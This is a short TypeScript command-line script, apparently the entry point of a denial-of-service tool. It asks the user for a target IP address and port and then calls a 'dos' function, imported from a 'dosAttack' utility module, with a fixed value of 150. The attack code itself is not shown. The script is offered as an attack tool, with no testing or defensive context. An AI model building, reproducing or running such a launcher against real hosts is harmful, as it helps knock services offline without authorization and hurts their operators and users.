import {createInterface} from "readline";
import {dos} from "./utils/dosAttack"

const inputIp = createInterface({
    input: process.stdin,
    output: process.stdout
});
inputIp.question("enter the ip: ", async(ip) => {
    inputIp.close();

    const inputPort = createInterface({
        input: process.stdin,
        output: process.stdout
    });

    inputPort.question("enter the port: ", async(port) => {
        inputPort.close();
        dos(ip, Number(port), 150)
    })
});